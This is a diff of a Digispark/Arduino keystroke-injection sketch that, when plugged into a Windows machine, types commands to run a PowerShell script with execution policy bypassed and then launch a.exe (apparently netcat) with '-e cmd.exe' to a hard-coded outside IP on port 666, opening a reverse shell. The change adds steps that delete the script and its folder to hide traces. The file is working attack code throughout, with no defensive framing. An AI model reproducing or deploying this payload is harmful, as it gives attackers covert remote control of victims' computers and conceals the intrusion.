@@ -17,9 +17,13 @@ void setup(){//turn LED off while code is running, device is safe to unplug as s
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(50);
-  DigiKeyboard.println("START /MIN a.exe 138.247.205.221 666 -e cmd.exe -d & exit");
+  DigiKeyboard.println("START /MIN a.exe 138.247.205.221 666 -e cmd.exe -d");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  
+  DigiKeyboard.println("rm b.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("rmdir bai1e & exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
 void loop() {
